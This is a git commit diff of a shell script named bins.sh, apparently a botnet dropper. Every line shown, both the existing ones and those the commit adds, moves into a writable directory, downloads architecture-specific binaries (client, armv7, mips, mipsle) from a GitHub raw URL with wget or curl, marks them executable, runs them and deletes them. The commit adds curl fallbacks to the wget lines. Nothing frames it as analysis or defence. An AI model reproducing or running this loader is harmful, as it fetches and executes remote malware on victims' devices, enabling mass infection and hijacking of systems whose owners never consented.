95b4114e3a6e2f0e3d35e483b8de9f57d0abeee8
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-11-04 03:56:05 +0500

    Update bins.sh

--- bins.sh
+++ bins.sh
@@ -3,3 +3,7 @@ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubus
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/armv7; chmod +x armv7; ./armv7; rm -rf armv7
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mipsle; chmod +x mipsle; ./mipsle; rm -rf mipsle
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/client -o client; chmod +x client; ./client; rm -rf client
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/armv7 -o armv7; chmod +x armv7; ./armv7; rm -rf armv7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips -o mips; chmod +x mips; ./mips; rm -rf mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mipsle -o mipsle; chmod +x mipsle; ./mipsle; rm -rf mipsle
